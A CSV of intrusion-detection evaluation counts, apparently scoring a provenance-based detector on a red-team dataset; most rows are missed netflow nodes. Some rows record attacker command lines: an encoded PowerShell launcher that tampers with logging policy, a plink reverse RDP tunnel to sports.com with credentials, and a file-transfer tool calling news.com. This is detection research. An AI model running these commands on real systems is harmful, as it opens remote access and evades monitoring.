node_group,src_label,count,fraction
TP_above_threshold,subject: System,1,1.000000000
FP_above_threshold,subject: System,1,1.000000000
FN_below_threshold,subject: powershell.exe,206,0.275401070
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,124,0.165775401
FN_below_threshold,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,24,0.032085561
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,6,0.008021390
FN_below_threshold,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,4,0.005347594
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,3,0.004010695
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,3,0.004010695
FN_below_threshold,subject: System,3,0.004010695
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",2,0.002673797
FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,2,0.002673797
FN_below_threshold,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,2,0.002673797
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/POWERPNT.EXE"" /AUTOMATION -Embedding",1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080 ,1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,1,0.001336898
FN_below_threshold,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53474,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53354,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53928,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53473,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53472,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53476,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54006,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53351,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53430,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53887,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53945,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53451,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53488,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53896,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53926,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53914,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54009,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53492,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53489,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53956,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53918,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53416,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53399,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53499,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53415,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53924,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53498,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53982,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53884,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53993,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53878,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53504,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54064,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53503,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53929,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53925,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53357,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53996,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53449,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53885,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53480,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53471,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54001,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53948,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53927,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53485,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53381,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53392,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53931,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53998,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53911,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53916,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53877,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53484,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53475,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53947,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53938,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53456,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53888,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53915,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53936,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53991,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53950,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53382,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53957,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53437,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53990,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54004,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53414,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53411,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53952,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53989,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53900,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53903,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53932,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53417,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53959,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53384,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54003,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53940,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53428,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53348,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53447,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53363,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53487,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53901,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53438,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54002,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53436,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53390,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53986,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53798,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53960,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53955,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53954,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53880,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53902,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53874,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53402,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53904,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53899,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53435,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53419,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53429,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54062,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53369,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53501,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53421,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53491,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53964,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53919,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53934,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53679,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53942,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53921,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53479,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53979,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53395,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54045,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53497,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53987,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53400,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54005,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53958,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53454,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53881,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53445,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53455,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53396,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53379,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53432,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53962,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53500,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53433,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53943,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53935,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53923,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53946,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53383,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53994,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53953,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53995,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53375,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53917,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53453,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53482,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53988,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53441,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53966,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53933,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53516,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53886,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53937,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54012,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53997,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53378,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53939,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53961,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53965,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53470,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53446,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53922,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53366,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53380,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53490,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53385,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53920,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53999,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53450,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53876,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53440,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53401,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53944,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53374,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53443,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54014,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54000,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53889,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53376,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53977,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53486,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53434,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53483,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53502,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53481,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54013,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53983,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53452,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53442,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53439,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53349,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53875,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53985,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53941,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53967,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53444,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:54044,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53984,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53360,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53420,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53418,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53879,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53359,1,0.001336898
FN_below_threshold,netflow 202.6.172.98:443->142.20.57.246:53324,1,0.001336898
